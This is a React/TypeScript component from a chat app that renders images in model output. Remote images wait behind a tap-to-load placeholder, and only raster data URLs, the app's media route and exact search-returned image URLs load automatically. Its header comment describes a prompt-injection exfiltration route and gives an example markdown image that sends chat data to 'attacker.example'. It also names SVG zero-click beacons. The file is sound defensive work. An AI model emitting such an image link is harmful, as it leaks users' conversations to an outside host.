import { BASE_URL } from '@actovia/shared/constants/systems'
import { TEST_IDS } from '@actovia/shared/constants/test-ids'
import type { WebSearchResult } from '@actovia/shared/types/web-search'
import { Image01Icon } from '@hugeicons/core-free-icons'
import { HugeiconsIcon } from '@hugeicons/react'
import { createContext, useContext, useReducer } from 'react'
import { useTranslation } from 'react-i18next'

import { LazyLoadImage } from '@/components/markdown/lazy-load-image'
import { cn } from '@/lib/utils'

/**
 * `markdown.tsx`'s `img` override. A remote `src` in model output can be a
 * tracking pixel or carry data out through its query string (prompt
 * injection), so it loads only when the user asks for it — see
 * docs/security-hardening.md, "Remote images in chat". actovia-ios applies the
 * same rule (`MarkdownImagePolicy.tapToLoadRemote`).
 *
 * What loads without a tap: a `data:` URL whose MIME is a raster image type,
 * the app's own media route (loopback only), and an `https:` image URL the
 * run's own web search returned, exactly (a result's thumbnail or favicon,
 * an image or video result's image or thumbnail). Trusting a result's *host*
 * would not do: the page that injects the instruction is itself a search
 * result, so `![](https://attacker.example/p.png?d=<chat data>)` — or a Google
 * Forms GET on `docs.google.com` — would load with no click. Everything else
 * — any other URL on the same host, an `http:` (non-TLS) image, a `data:` URL that is not a recognised raster type
 * (an SVG rendered as `<img>` still resolves `<image href>`, `feImage` and
 * `url()` references as its own image fetches — a zero-click exfiltration
 * beacon — and any other or missing MIME, or a malformed `data:` URL, get the
 * same treatment) — shows a compact placeholder instead.
 */

const MEDIA_ROUTE_PREFIX = `${BASE_URL}/api/v1/media/`

// `data:` MIME types safe to auto-load: plain raster formats with no way to
// reference another URL from inside their own bytes (unlike `image/svg+xml`).
const RASTER_DATA_IMAGE_TYPES = new Set([
  'image/png',
  'image/jpeg',
  'image/jpg',
  'image/gif',
  'image/webp',
  'image/avif'
])

/** The MIME of a `data:` URL, lowercased and without any `;base64` /
 *  charset parameters — `null` when `src` is not `data:`-scheme or is
 *  missing the `,` that separates its header from its payload. */
function dataUrlMimeType(src: string): string | null {
  const lower = src.toLowerCase()
  if (!lower.startsWith('data:')) return null
  const rest = lower.slice('data:'.length)
  const comma = rest.indexOf(',')
  if (comma === -1) return null
  const [mime] = rest.slice(0, comma).split(';')
  return mime.trim()
}

export function isRasterDataUrl(src: string): boolean {
  const mime = dataUrlMimeType(src)
  return mime !== null && RASTER_DATA_IMAGE_TYPES.has(mime)
}

// Provided by `Markdown` from the run's `webSearchResults` prop (the exact
// image URLs, normalized by `new URL().href`), in its own
// context rather than through the ReactMarkdown `components` map: threading
// it through `components` would give that object a new identity whenever
// search results streamed in, which would invalidate every memoized block in
// the document (see markdown-citations.tsx's `WebSearchRankMapContext`,
// which exists for the same reason).
export const AllowedImageUrlsContext =
  createContext<ReadonlySet<string> | null>(null)

function hostnameOf(src: string): string | null {
  try {
    return new URL(src).hostname
  } catch {
    return null
  }
}

/** `src` as an `https:` URL in `URL.href` form, or null. */
function httpsHref(src: string | undefined): string | null {
  if (!src) return null
  try {
    const url = new URL(src)
    return url.protocol === 'https:' ? url.href : null
  } catch {
    return null
  }
}

/** The exact image URLs a run's own web search returned — safe to
 *  auto-load. Never the result pages or their hosts. */
export function allowedImageUrls(
  webSearchResults: WebSearchResult[] | undefined
): ReadonlySet<string> | null {
  if (!webSearchResults || webSearchResults.length === 0) return null
  const urls = new Set<string>()
  const add = (src: string | undefined) => {
    const href = httpsHref(src)
    if (href) urls.add(href)
  }
  for (const result of webSearchResults) {
    add(result.thumbnail)
    add(result.favicon)
    for (const media of result.media ?? []) {
      if (media.kind === 'image') add(media.url)
      add(media.thumbnailUrl)
    }
  }
  return urls.size > 0 ? urls : null
}

/**
 * The thumbnails a run's search returned — a page's thumbnail, a media
 * result's thumbnail — and nothing else: what a step's picture may be. A
 * media result's original `url`, which `allowedImageUrls` admits for a
 * Markdown image, is left out on purpose: an original is a hot-link the
 * source site may refuse or swap (owner, 2026-10-07).
 */
export function searchThumbnailUrls(
  webSearchResults: WebSearchResult[] | undefined
): ReadonlySet<string> | null {
  if (!webSearchResults || webSearchResults.length === 0) return null
  const urls = new Set<string>()
  const add = (src: string | undefined) => {
    const href = httpsHref(src)
    if (href) urls.add(href)
  }
  for (const result of webSearchResults) {
    add(result.thumbnail)
    for (const media of result.media ?? []) add(media.thumbnailUrl)
  }
  return urls.size > 0 ? urls : null
}

/** Provided by `Markdown` beside `AllowedImageUrlsContext`, for the same reason. */
export const SearchThumbnailUrlsContext =
  createContext<ReadonlySet<string> | null>(null)

/** `src` in `URL.href` form when it is one of the thumbnails; null otherwise. */
export function thumbnailHref(
  src: string,
  thumbnails: ReadonlySet<string> | null
): string | null {
  const href = httpsHref(src)
  return href !== null && thumbnails?.has(href) ? href : null
}

/** A `data:` URL, the app's own media route, or an `https:` image URL in
 *  `allowedUrls` — loads without asking. */
export function loadsAutomatically(
  src: string,
  allowedUrls: ReadonlySet<string> | null
): boolean {
  if (isRasterDataUrl(src)) return true
  if (src.startsWith(MEDIA_ROUTE_PREFIX)) return true
  if (!allowedUrls) return false
  const href = httpsHref(src)
  return href !== null && allowedUrls.has(href)
}

// Every `src` the user has chosen to load, for the life of the renderer
// process. A module-level Set, not React state: a placeholder can unmount
// (a re-parsed streaming block, leaving the chat and coming back) and remount
// without asking again — "loaded" is a fact about the URL, not about one
// component instance.
const loadedRemoteImages = new Set<string>()

export function RemoteImage({
  src,
  alt,
  className,
  ...rest
}: {
  src?: string
  alt?: string
  className?: string
  [key: string]: unknown
}) {
  const { t } = useTranslation('chat')
  const allowedUrls = useContext(AllowedImageUrlsContext)
  // Only used to force a re-render after a click; `loaded` itself is always
  // read fresh from the module-level Set below, never cached in state — the
  // same `src` position can carry a different URL frame to frame while a
  // reply streams.
  const [, forceRerender] = useReducer((n: number) => n + 1, 0)

  const loaded =
    src !== undefined &&
    (loadsAutomatically(src, allowedUrls) || loadedRemoteImages.has(src))

  // Already here (a `data:` URL): drawn directly. From the network:
  // `LazyLoadImage` (owner, 2026-09-30), at the picture's own size, holding
  // room for its skeleton until it is in.
  if (!src || (loaded && src.toLowerCase().startsWith('data:'))) {
    return (
      <img
        {...rest}
        src={src}
        alt={alt ?? ''}
        loading="lazy"
        className={cn('mb-3', className)}
      />
    )
  }
  if (loaded) {
    return (
      <LazyLoadImage
        src={src}
        alt={alt ?? ''}
        className={cn('mb-3 inline-flex size-auto max-w-full', className)}
        loadingClassName="h-48 w-80"
        skeletonClassName="rounded-lg"
        imgClassName="size-auto max-w-full object-contain"
      />
    )
  }

  // A `data:` URL has no host to show (and, unlike a remote URL, nothing to
  // fetch by tapping "Load image" either — it just stops being hidden): the
  // label says what it is instead of a blank or the raw payload.
  const label = src.toLowerCase().startsWith('data:')
    ? t('remoteImage.inlineImage')
    : (hostnameOf(src) ?? src)

  return (
    <span
      data-testid={TEST_IDS.chat.remoteImage.placeholder}
      className="border-border/50 bg-background/70 text-muted-foreground mb-3 flex max-w-full flex-wrap items-center gap-2 rounded-lg border px-3 py-2 text-sm backdrop-blur-md"
    >
      <HugeiconsIcon
        icon={Image01Icon}

        className="size-3.5 shrink-0"
        aria-hidden
      />
      <span className="text-foreground min-w-0 truncate font-medium">
        {label}
      </span>
      {alt && <span className="min-w-0 flex-1 truncate">{alt}</span>}
      <button
        type="button"
        data-testid={TEST_IDS.chat.remoteImage.loadButton}
        onClick={() => {
          loadedRemoteImages.add(src)
          forceRerender()
        }}
        className="text-primary shrink-0 hover:underline"
      >
        {t('remoteImage.loadButton')}
      </button>
    </span>
  )
}
